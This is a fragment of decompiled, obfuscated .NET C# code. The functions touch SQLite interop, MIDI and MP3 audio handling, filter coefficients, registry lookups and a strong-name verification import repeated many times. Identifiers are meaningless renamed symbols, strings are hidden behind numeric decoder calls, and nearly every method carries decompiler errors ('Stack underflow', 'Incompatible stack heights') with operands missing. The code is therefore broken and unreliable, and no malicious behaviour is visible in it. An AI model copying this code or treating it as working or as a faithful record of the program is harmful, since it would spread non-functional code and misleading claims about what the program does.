			//IL_0050: Incompatible stack heights: 0 vs 1
			_ = global::_001A._007E_001D_0003;
			/*Error near IL_0050: Stack underflow*/((object)/*Error near IL_0050: Stack underflow*/);
			int num = (int)/*Error near IL_0053: Stack underflow*/;
			if (num == _0018._0001(_0080._0014._0001(107352269)))
			{
				P_1._0002 = true;
			}
			else if (num != _0018._0001(_0080._0014._0001(107393181)))
			{
				throw new FormatException(_0080._0014._0001(107352260));
			}
		}

		static bool _0001(global::_0016._001E P_0)
		{
			//IL_0007: Invalid comparison between Unknown and I4
			//IL_0012: Incompatible stack heights: 0 vs 1
			_0018._0001();
			if ((int)/*Error near IL_0009: Stack underflow*/ >= 3009000)
			{
				return true;
			}
			return false;
		}

		static string _0001(string _0002, byte[] _0003, int _0004)
		{
			//IL_0086: Incompatible stack heights: 0 vs 1
			new StringBuilder();
			StringBuilder stringBuilder = (StringBuilder)/*Error near IL_008c: Stack underflow*/;
			int num = 0;
			foreach (byte b in _0003)
			{
				_0088_0003._007E_0082_0007(stringBuilder, _0080._0014._0001(107352247), b, _0002);
				if (++num % _0004 == 0)
				{
					_008B_0002._007E_0094_0005(stringBuilder, _0080._0014._0001(107352202));
				}
			}
			_008B_0002._007E_0094_0005(stringBuilder, _0080._0014._0001(107352202));
			return global::_0002._007E_0006(stringBuilder);
		}

		[DllImport("winmm.dll", CharSet = CharSet.Auto, EntryPoint = "midiOutGetDevCaps")]
		static extern MmResult _0001(IntPtr _0002, out global::_0005._0011 _0003, int _0004);

		static void _0001(string _0002, global::_0008._0001 P_1)
		{
			//IL_0019: Unknown result type (might be due to invalid IL or missing references)
			//IL_0021: Incompatible stack heights: 0 vs 2
			//IL_0028: Incompatible stack heights: 0 vs 2
			//IL_002f: Incompatible stack heights: 0 vs 1
			_ = _0014_0006._0003_0010;
			_ = global::_0002._007E_0006;
			_0080._0014._0001(107352197);
			/*Error near IL_002f: Stack underflow*/((object)/*Error near IL_002f: Stack underflow*/);
			/*Error near IL_001e: Stack underflow*/((string)/*Error near IL_001e: Stack underflow*/, (string)/*Error near IL_001e: Stack underflow*/, (MessageBoxButtons)0, (MessageBoxIcon)64);
		}

		static void _0001(int _0002, global::_0004._0016 _0003, byte[] _0004, int P_3)
		{
			//IL_0035: Incompatible stack heights: 0 vs 1
			//IL_003f: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0004._0016)/*Error near IL_003c: Stack underflow*/);
			_0018._0001((global::_0004._0016)/*Error near IL_000b: Stack underflow*/);
			_0018._0001(P_3, _0004, _0002, _0003);
			_0080._0017 obj = _0018._0001(global::_0010._0080._0001(_0003._0001), _0004, _0002, P_3);
			if (obj != 0)
			{
				throw new SQLiteException(obj, null);
			}
		}

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_open16_interop")]
		static extern _0080._0017 _0001(byte[] _0002, byte[] _0003, global::_0004._0015 _0004, int _0005, ref IntPtr _0006);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(global::_0017._0008._0003 _0002, global::_000E._000E P_1)
		{
			//IL_0005: Invalid comparison between Unknown and I4
			//IL_0068: Incompatible stack heights: 0 vs 1
			//IL_006f: Incompatible stack heights: 0 vs 1
			//IL_0072: Incompatible stack heights: 0 vs 1
			_ = ((global::_000E._000E)/*Error near IL_006f: Stack underflow*/).Strategy;
			if ((int)/*Error near IL_0007: Stack underflow*/ == 1)
			{
				_007F._0007 obj = new _007F._0007(_0002);
				((global::_000E._000E)/*Error near IL_0014: Stack underflow*/)._0001 = obj;
				global::_0008._007E_001D_0002(P_1._0001);
				P_1.Handle = _0096_0002._007E_0008_0006(P_1._0001);
			}
			else if (P_1.Strategy == _001B._0007._0003)
			{
				P_1._0001 = new _001D._0003(_0002);
				_0015_0006._007E_0004_0010(P_1._0001, P_1.Handle);
			}
		}

		static void _0001(global::_0017._007F._0008 P_0)
		{
			//IL_00d3: Incompatible stack heights: 0 vs 1
			//IL_00d9: Incompatible stack heights: 0 vs 1
			if (((global::_0017._007F._0008)/*Error near IL_000a: Stack underflow*/)._0014 >= 65274)
			{
				_0018._0001((global::_0017._007F._0008)/*Error near IL_00e3: Stack underflow*/);
			}
			while (P_0._0015 < 262 && P_0._0017 < P_0._0018)
			{
				int num = 65536 - P_0._0015 - P_0._0014;
				if (num > P_0._0018 - P_0._0017)
				{
					num = P_0._0018 - P_0._0017;
				}
				Array.Copy(P_0._0002, P_0._0017, P_0._0001, P_0._0014 + P_0._0015, num);
				P_0._0017 += num;
				P_0._0016 += num;
				P_0._0015 += num;
			}
			if (P_0._0015 >= 3)
			{
				_0018._0001(P_0);
			}
		}

		static void _0001(_001F._0019 P_0)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			if (((_001F._0019)/*Error near IL_0007: Stack underflow*/)._0002)
			{
				_ = global::_0002._007E_0016;
				_0091._0080_0004(typeof(_001F._0019).TypeHandle);
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
				throw new ObjectDisposedException((string?)/*Error near IL_0021: Stack underflow*/);
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(global::_0017._0080 _0002, bool P_1)
		{
			//IL_008c: Incompatible stack heights: 0 vs 1
			//IL_009c: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0017._0080)/*Error near IL_0096: Stack underflow*/);
			if (((global::_0017._0080)/*Error near IL_0014: Stack underflow*/)._0001 == null)
			{
				throw new InvalidOperationException(_0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107352220), new object[1] { P_1 ? _0080._0014._0001(107352106) : _0080._0014._0001(107352151) }));
			}
			if ((_0002._0003 & SQLiteConnectionFlags.NoLoadExtension) == SQLiteConnectionFlags.NoLoadExtension)
			{
				throw new SQLiteException(_0080._0014._0001(107358644));
			}
			_0002._0001._0003(P_1);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(string _0002, global::_0017._0080 P_1)
		{
			//IL_000f: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 2
			_0018._0001((global::_0017._0080)/*Error near IL_0016: Stack underflow*/);
			_ = null;
			_0018._0001((string)/*Error near IL_000d: Stack underflow*/, (global::_0017._0080)/*Error near IL_000d: Stack underflow*/, _0002);
		}

		static System.Data.IsolationLevel _0001(global::_0017._0080 _0002, System.Data.IsolationLevel P_1)
		{
			//IL_007c: Incompatible stack heights: 0 vs 1
			//IL_0082: Incompatible stack heights: 0 vs 1
			//IL_0088: Incompatible stack heights: 0 vs 1
			if ((((global::_0017._0080)/*Error near IL_0007: Stack underflow*/)._0003 & SQLiteConnectionFlags.MapIsolationLevels) != SQLiteConnectionFlags.MapIsolationLevels)
			{
				return (System.Data.IsolationLevel)/*Error near IL_001c: Stack underflow*/;
			}
			switch (/*Error near IL_0021: Stack underflow*/)
			{
			case -1L:
			case 16L:
			case 256L:
			case 4096L:
				return System.Data.IsolationLevel.ReadCommitted;
			case 65536L:
			case 1048576L:
			case 16777216L:
				return System.Data.IsolationLevel.Serializable;
			default:
				return System.Data.IsolationLevel.Serializable;
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(global::_0001._0016 _0002, float[] P_1)
		{
			//IL_005f: Incompatible stack heights: 0 vs 2
			float num = 0f;
			for (int i = 0; i < P_1.Length; i++)
			{
				_ = _0017_0003._0093_0006;
				float num2 = _0016_0003._0092_0006(P_1[i]);
				num = /*Error near IL_0025: Stack underflow*/((float)/*Error near IL_0025: Stack underflow*/, num2);
			}
			if ((double)num > 1.0)
			{
				for (int j = 0; j < P_1.Length; j++)
				{
					P_1[j] /= num;
				}
			}
		}

		static long? _0001(_0014 _0002, int P_1)
		{
			//IL_0057: Incompatible stack heights: 0 vs 1
			//IL_0061: Incompatible stack heights: 0 vs 1
			if (0 == 0)
			{
				_0018._0001((_0014)/*Error near IL_005e: Stack underflow*/);
			}
			if (((_0014)/*Error near IL_000d: Stack underflow*/)._0001 == null)
			{
				return null;
			}
			string text = _0018._0001(_0002, P_1);
			string text2 = _0018._0001(_0002, P_1);
			int num = _0018._0001(text, text2, _0002._0001);
			if (num != -1)
			{
				return _0002.GetInt64(num);
			}
			return _0018._0001(_0002._0001, text, text2);
		}

		static void _0001(global::_0004._0016 P_0)
		{
			//IL_0029: Incompatible stack heights: 0 vs 2
			//IL_0030: Incompatible stack heights: 0 vs 1
			//IL_0037: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			global::_0010._0080._0001(((global::_0004._0016)/*Error near IL_000c: Stack underflow*/)._0001);
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_0037: Stack underflow*/((IntPtr)/*Error near IL_0037: Stack underflow*/, zero);
			if ((int)/*Error near IL_0017: Stack underflow*/ != 0)
			{
				throw new InvalidOperationException(_0080._0014._0001(107352125));
			}
		}

		static SQLiteConnectionFlags _0001(global::_0010._001C _0002)
		{
			//IL_001c: Incompatible stack heights: 0 vs 1
			//IL_001f: Incompatible stack heights: 0 vs 1
			try
			{
				if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
				{
					global::_0017._0080 obj = ((global::_0010._001C)/*Error near IL_000b: Stack underflow*/)._0001;
					if (obj != null)
					{
						return obj.Flags;
					}
				}
			}
			catch (ObjectDisposedException)
			{
			}
			return SQLiteConnectionFlags.Default;
		}

		static global::_0018._0003 _0001(int _0002, global::_0018._0003 P_1)
		{
			//IL_0003: Invalid comparison between Unknown and I4
			//IL_0013: Invalid comparison between Unknown and I4
			//IL_0044: Incompatible stack heights: 0 vs 1
			//IL_0047: Incompatible stack heights: 0 vs 1
			//IL_004a: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0005: Stack underflow*/ >= 0)
			{
				int num = ((global::_0018._0003)/*Error near IL_000e: Stack underflow*/)._0001._0006;
				if ((int)/*Error near IL_0015: Stack underflow*/ < num)
				{
					return new global::_0018._0003(P_1._0001, P_1._0001._0002, _0002, P_1._0001);
				}
			}
			throw new ArgumentOutOfRangeException(_0080._0014._0001(107352068));
		}

		static void _0001(global::_0005._0003 _0002, global::_0012._0005 P_1)
		{
			//IL_0019: Invalid comparison between Unknown and I4
			//IL_00a1: Incompatible stack heights: 0 vs 1
			//IL_00ab: Incompatible stack heights: 0 vs 1
			//IL_00b1: Incompatible stack heights: 0 vs 1
			_ = ((global::_0005._0003)/*Error near IL_00ab: Stack underflow*/).SampleRate;
			int num = ((global::_0005._0005)((global::_0012._0005)/*Error near IL_0014: Stack underflow*/).Mp3WaveFormat)._0001;
			if ((int)/*Error near IL_001b: Stack underflow*/ != num)
			{
				throw new InvalidOperationException(_009D._0093_0004(_0080._0014._0001(107352083), _0002.SampleRate, ((global::_0005._0005)P_1.Mp3WaveFormat)._0001));
			}
			if (((_0002.ChannelMode == ChannelMode.Mono) ? 1 : 2) != ((global::_0005._0005)P_1.Mp3WaveFormat)._0001)
			{
				throw new InvalidOperationException(_009D._0093_0004(_0080._0014._0001(107352437), _0002.ChannelMode, (int)((global::_0005._0005)P_1.Mp3WaveFormat)._0001));
			}
		}

		[DllImport("winmm.dll", EntryPoint = "midiOutSetVolume")]
		static extern MmResult _0001(IntPtr _0002, int _0003);

		static int _0001(global::_0004._0016 P_0)
		{
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0027: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0004._0016)/*Error near IL_0024: Stack underflow*/);
			_0018._0001((global::_0004._0016)/*Error near IL_000b: Stack underflow*/);
			return _0018._0001(global::_0010._0080._0001(P_0._0001));
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static _001D._0016 _0001(float _0002, float _0003, float _0004)
		{
			//IL_0011: Unknown result type (might be due to invalid IL or missing references)
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_007a: Incompatible stack heights: 0 vs 3
			//IL_007d: Incompatible stack heights: 0 vs 2
			//IL_0084: Expected F8, but got Unknown
			//IL_0084: Incompatible stack heights: 0 vs 2
			_ = global::_0015._009B_0002;
			_ = Math.PI * 2.0;
			double num = (double)/*Error near IL_0011: Stack underflow*/;
			_ = /*Error near IL_0012: Stack underflow*/* num;
			double num2 = (double)/*Error near IL_0015: Stack underflow*/;
			Math.Cos(/*Error near IL_0016: Stack underflow*/ / num2);
			double num3 = (double)/*Error near IL_001a: Stack underflow*/;
			double num4 = /*Error near IL_001f: Stack underflow*/((double)/*Error near IL_001f: Stack underflow*/);
			double num5 = num4 / (double)(2f * _0002);
			double num6 = num4 / 2.0;
			int num7 = 0;
			double num8 = (0.0 - num4) / 2.0;
			double num9 = 1.0 + num5;
			double num10 = -2.0 * num3;
			double num11 = 1.0 - num5;
			return new _001D._0016(num9, num10, num11, num6, num7, num8);
		}

		static void _0001(global::_0017._007F._0003 _0002, int P_1)
		{
			//IL_004f: Incompatible stack heights: 0 vs 1
			//IL_0052: Incompatible stack heights: 0 vs 1
			int num = ((global::_0017._007F._0003)/*Error near IL_0009: Stack underflow*/)._0004;
			((global::_0017._007F._0003)/*Error near IL_0013: Stack underflow*/)._0004 = num + 1;
			if (num == 32768)
			{
				throw new InvalidOperationException();
			}
			_0002._0001[_0002._0003++] = (byte)P_1;
			_0002._0003 &= 32767;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static long _0001(int _0002, _001F._0019 _0003, int _0004, int _0005, byte[] _0006, long P_5)
		{
			//IL_0058: Incompatible stack heights: 0 vs 1
			//IL_005b: Incompatible stack heights: 0 vs 1
			_0018._0001((_001F._0019)/*Error near IL_0062: Stack underflow*/, (int)/*Error near IL_0062: Stack underflow*/);
			if (_0003._0001[_0002]._0001 != null)
			{
				return _0016_0006._007E_0005_0010(_0003._0001[_0002]._0001._0001, _0003._0001[_0002]._0004, P_5, _0006, _0005, _0004);
			}
			throw new InvalidCastException();
		}

		static void _0001(global::_0015._0004 P_0)
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			//IL_0012: Incompatible stack heights: 0 vs 1
			new Container();
			((global::_0015._0004)/*Error near IL_0009: Stack underflow*/)._0001 = (Container)/*Error near IL_0009: Stack underflow*/;
		}

		static string _0001(Guid _0002)
		{
			//IL_007f: Incompatible stack heights: 0 vs 3
			//IL_0086: Incompatible stack heights: 0 vs 1
			string result = null;
			_ = _0019_0005._007E_0003_000F;
			_ = Registry.LocalMachine;
			_0080._0014._0001(107351763);
			/*Error near IL_0086: Stack underflow*/((object)/*Error near IL_0086: Stack underflow*/, (string)/*Error near IL_0086: Stack underflow*/);
			RegistryKey registryKey = (RegistryKey)/*Error near IL_0017: Stack underflow*/;
			try
			{
				RegistryKey registryKey2 = _0019_0005._007E_0003_000F(registryKey, _0002.ToString(_0080._0014._0001(107381790)));
				try
				{
					if (registryKey2 != null)
					{
						return _0006_0004._007E_0011_0008(registryKey2, _0080._0014._0001(107351698)) as string;
					}
					return result;
				}
				finally
				{
					if (registryKey2 != null)
					{
						global::_0008._007E_0098(registryKey2);
					}
				}
			}
			finally
			{
				if (registryKey != null)
				{
					global::_0008._007E_0098(registryKey);
				}
			}
		}

		static int _0001(MediaType _0002, Guid P_1)
		{
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 2
			_ = ((MediaType)/*Error near IL_0007: Stack underflow*/)._0001;
			((_0019._0012)/*Error near IL_001a: Stack underflow*/)._0002((Guid)/*Error near IL_001a: Stack underflow*/, out int result);
			return result;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_value_int")]
		static extern int _0001(IntPtr _0002);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_value_bytes")]
		static extern int _0001(IntPtr _0002);

		static global::_0005._0011 _0001(int _0002)
		{
			//IL_003d: Incompatible stack heights: 0 vs 2
			//IL_0044: Incompatible stack heights: 0 vs 1
			global::_0005._0011 result = default(global::_0005._0011);
			_ = _0098._0089_0004;
			object obj = (global::_0005._0011)/*Error near IL_0014: Stack underflow*/;
			/*Error near IL_0044: Stack underflow*/(obj);
			int num = (int)/*Error near IL_0047: Stack underflow*/;
			_0018._0001(_0018._0001(_0099._008E_0004(_0002), out result, num), _0080._0014._0001(107351657));
			return result;
		}

		static void _0001(_0019._0010 P_0)
		{
			//IL_002d: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 2
			object obj = ((_0019._0010)/*Error near IL_0007: Stack underflow*/)._0001;
			object obj2 = default(object);
			if (0 == 0)
			{
				obj2 = obj;
			}
			_ = _0091_0002._009C_0005;
			/*Error near IL_0017: Stack underflow*/((object)/*Error near IL_0017: Stack underflow*/);
			try
			{
				_0018._0001(P_0);
			}
			finally
			{
				_0091_0002._009D_0005(obj2);
			}
		}

		static void _0001(IntPtr _0002, global::_000E._001F _0003)
		{
			//IL_0047: Incompatible stack heights: 0 vs 1
			//IL_004a: Incompatible stack heights: 0 vs 2
			//IL_0051: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				return;
			}
			_ = _0090_0002._009A_0005;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_0051: Stack underflow*/((IntPtr)/*Error near IL_0051: Stack underflow*/, zero);
			if ((int)/*Error near IL_0014: Stack underflow*/ != 0)
			{
				return;
			}
			try
			{
			}
			finally
			{
				global::_000E._001F obj;
				_0091_0002._009C_0005(obj = _0003);
				try
				{
					_0080._0017 obj2 = _0018._0001(_0002);
					if (obj2 != 0)
					{
						throw new SQLiteException(obj2, null);
					}
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(_007F._0014 _0002, Exception P_1)
		{
			//IL_006b: Incompatible stack heights: 0 vs 1
			//IL_0071: Incompatible stack heights: 0 vs 1
			new _007F._0014._0001();
			_007F._0014._0001 CS_0024_003C_003E8__locals0 = (_007F._0014._0001)/*Error near IL_006e: Stack underflow*/;
			((_007F._0014._0001)/*Error near IL_000c: Stack underflow*/)._0001 = _0002;
			CS_0024_003C_003E8__locals0._0001 = P_1;
			CS_0024_003C_003E8__locals0._0001 = _0002._0001;
			if (CS_0024_003C_003E8__locals0._0001 == null)
			{
				return;
			}
			if (_0002._0001 == null)
			{
				CS_0024_003C_003E8__locals0._0001(_0002, new global::_0003._0003(CS_0024_003C_003E8__locals0._0001));
				return;
			}
			_0011_0005._007E_0097_000E(_0002._0001, delegate
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 2
				_ = ((_007F._0014._0001)/*Error near IL_0007: Stack underflow*/)._0001;
				_ = ((_007F._0014._0001)/*Error near IL_000e: Stack underflow*/)._0001;
				global::_0003._0003 e = new global::_0003._0003(((_007F._0014._0001)/*Error near IL_0015: Stack underflow*/)._0001);
				/*Error near IL_001f: Stack underflow*/((object?)/*Error near IL_001f: Stack underflow*/, e);
			}, null);
		}

		static void _0001(BinaryWriter _0002, _001A._0005 P_1)
		{
			//IL_0050: Incompatible stack heights: 0 vs 1
			//IL_0057: Incompatible stack heights: 0 vs 1
			//IL_005a: Incompatible stack heights: 0 vs 1
			_0018._0001((_001A._0005)/*Error near IL_0057: Stack underflow*/);
			if ((int)/*Error near IL_0006: Stack underflow*/ != 0)
			{
				int num = ((_001A._0005)/*Error near IL_000d: Stack underflow*/)._0001._0003 * P_1._0001._0001;
				if (num != 0)
				{
					_009E_0002._007E_001B_0006(_0002, (int)P_1._0002, SeekOrigin.Begin);
					_009D_0002._007E_0016_0006(_0002, (int)(P_1._0003 * 8 / num));
				}
			}
		}

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_column_name16_interop")]
		static extern IntPtr _0001(IntPtr _0002, int _0003, ref int _0004);

		static string _0001()
		{
			//IL_0112: Incompatible stack heights: 0 vs 1
			//IL_011e: Incompatible stack heights: 0 vs 1
			try
			{
				global::_0001._0001();
				Assembly assembly = (Assembly)/*Error near IL_0118: Stack underflow*/;
				if ((int)/*Error near IL_0016: Stack underflow*/ == 0)
				{
					object obj;
					_0091_0002._009C_0005(obj = global::_0017._0084._0001);
					try
					{
						global::_0017._0084._0001 = true;
					}
					finally
					{
						_0091_0002._009D_0005(obj);
					}
					return null;
				}
				string text = null;
				if (!_0018._0001(assembly, ref text))
				{
					text = global::_0002._007E_001D(assembly);
				}
				if (global::_001C._0096_0003(text))
				{
					object obj2;
					_0091_0002._009C_0005(obj2 = global::_0017._0084._0001);
					try
					{
						global::_0017._0084._0001 = true;
					}
					finally
					{
						_0091_0002._009D_0005(obj2);
					}
					return null;
				}
				string text2 = global::_001E._0099_0003(text);
				if (global::_001C._0096_0003(text2))
				{
					object obj3;
					_0091_0002._009C_0005(obj3 = global::_0017._0084._0001);
					try
					{
						global::_0017._0084._0001 = true;
					}
					finally
					{
						_0091_0002._009D_0005(obj3);
					}
					return null;
				}
				object obj4;
				_0091_0002._009C_0005(obj4 = global::_0017._0084._0001);
				try
				{
					global::_0017._0084._0008 = text2;
				}
				finally
				{
					_0091_0002._009D_0005(obj4);
				}
				return text2;
			}
			catch (Exception ex)
			{
				try
				{
					_0015_0004._001E_0008(_0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107351664), new object[1] { ex }));
				}
				catch
				{
				}
			}
			object obj6;
			_0091_0002._009C_0005(obj6 = global::_0017._0084._0001);
			try
			{
				global::_0017._0084._0001 = true;
			}
			finally
			{
				_0091_0002._009D_0005(obj6);
			}
			return null;
		}

		static string _0001()
		{
			//IL_00cd: Incompatible stack heights: 0 vs 2
			//IL_00d7: Incompatible stack heights: 0 vs 1
			_ = global::_0002._007E_0019;
			_0097_0004._001F_000E();
			/*Error near IL_00d7: Stack underflow*/((object)/*Error near IL_00d7: Stack underflow*/);
			string text = (string)/*Error near IL_00dd: Stack underflow*/;
			string text2 = _0018._0001(text, global::_0017._0084._0004);
			if (global::_001C._0097_0003(text2))
			{
				object obj;
				_0091_0002._009C_0005(obj = global::_0017._0084._0001);
				try
				{
					global::_0017._0084._000E = text2;
					return text2;
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
			}
			text = _0018._0001();
			text2 = _0018._0001(text, global::_0017._0084._0004);
			if (global::_001C._0097_0003(text2))
			{
				object obj2;
				_0091_0002._009C_0005(obj2 = global::_0017._0084._0001);
				try
				{
					global::_0017._0084._000E = text2;
					return text2;
				}
				finally
				{
					_0091_0002._009D_0005(obj2);
				}
			}
			object obj3;
			_0091_0002._009C_0005(obj3 = global::_0017._0084._0001);
			try
			{
				global::_0017._0084._0002 = true;
			}
			finally
			{
				_0091_0002._009D_0005(obj3);
			}
			return null;
		}

		static _001D._0016 _0001(float _0002, float _0003, float _0004)
		{
			//IL_0011: Unknown result type (might be due to invalid IL or missing references)
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_0066: Incompatible stack heights: 0 vs 3
			//IL_0069: Incompatible stack heights: 0 vs 2
			//IL_0070: Expected F8, but got Unknown
			//IL_0070: Incompatible stack heights: 0 vs 2
			_ = global::_0015._009B_0002;
			_ = Math.PI * 2.0;
			double num = (double)/*Error near IL_0011: Stack underflow*/;
			_ = /*Error near IL_0012: Stack underflow*/* num;
			double num2 = (double)/*Error near IL_0015: Stack underflow*/;
			Math.Cos(/*Error near IL_0016: Stack underflow*/ / num2);
			double num3 = (double)/*Error near IL_001a: Stack underflow*/;
			double num4 = /*Error near IL_001f: Stack underflow*/((double)/*Error near IL_001f: Stack underflow*/) / (double)(2f * _0002);
			double num5 = num4;
			int num6 = 0;
			double num7 = 0.0 - num4;
			double num8 = 1.0 + num4;
			double num9 = -2.0 * num3;
			double num10 = 1.0 - num4;
			return new _001D._0016(num8, num9, num10, num5, num6, num7);
		}

		unsafe static void _0001(IntPtr _0002, IntPtr[] _0003, int _0004, int _0005)
		{
			//IL_005a: Incompatible stack heights: 0 vs 2
			//IL_0061: Incompatible stack heights: 0 vs 1
			_ = _0010_0005._0096_000E;
			/*Error near IL_0061: Stack underflow*/((IntPtr)/*Error near IL_0061: Stack underflow*/);
			float* ptr = (float*)/*Error near IL_0064: Stack underflow*/;
			int* ptr2 = (int*)_0010_0005._0096_000E(_0003[0]);
			int* ptr3 = (int*)_0010_0005._0096_000E(_0003[1]);
			for (int i = 0; i < _0005; i++)
			{
				int* num = ptr2;
				ptr2 = num + 1;
				*num = _0018._0001((double)(*ptr));
				int* num2 = ptr3;
				ptr3 = num2 + 1;
				*num2 = _0018._0001((double)ptr[1]);
				ptr += 2;
			}
		}

		static bool _0001(global::_0013._0010 _0002)
		{
			//IL_0025: Incompatible stack heights: 0 vs 1
			//IL_0028: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0 && ((global::_0013._0010)/*Error near IL_000b: Stack underflow*/)._0001 == MidiCommandCode.NoteOn)
			{
				return ((global::_0013._0011)/*Error near IL_0015: Stack underflow*/)._0002 > 0;
			}
			return false;
		}

		static void _0001(int _0002, long _0003, IntPtr _0004)
		{
			//IL_0012: Incompatible stack heights: 0 vs 2
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 1
			_ = _0017_0006._0006_0010;
			/*Error near IL_0010: Stack underflow*/((IntPtr)/*Error near IL_0010: Stack underflow*/, (int)/*Error near IL_0010: Stack underflow*/, (long)/*Error near IL_0010: Stack underflow*/);
		}

		static void _0001(global::_0013._0007 _0002, BinaryReader P_1)
		{
			//IL_0027: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 2
			//IL_002d: Incompatible stack heights: 0 vs 1
			if (((global::_0005._0005)/*Error near IL_0007: Stack underflow*/)._0004 > 0)
			{
				_ = _0082._007E_0007_0004;
				byte[] array = ((global::_0013._0007)/*Error near IL_0018: Stack underflow*/)._0001;
				short num = _0002._0004;
				/*Error near IL_0024: Stack underflow*/((object)/*Error near IL_0024: Stack underflow*/, array, 0, num);
			}
		}

		static DataTable _0001(global::_0017._0080 _0002, string _0003, string _0004, string P_3)
		{
			//IL_0877: Incompatible stack heights: 0 vs 1
			//IL_0881: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107352059);
			new DataTable((string?)/*Error near IL_0881: Stack underflow*/);
			DataTable dataTable = (DataTable)/*Error near IL_0887: Stack underflow*/;
			_0001_0005._007E_008A_000E(dataTable, _008F_0003._008B_0007());
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362379), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362386), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362361), _0091._0080_0004(typeof(string).TypeHandle));
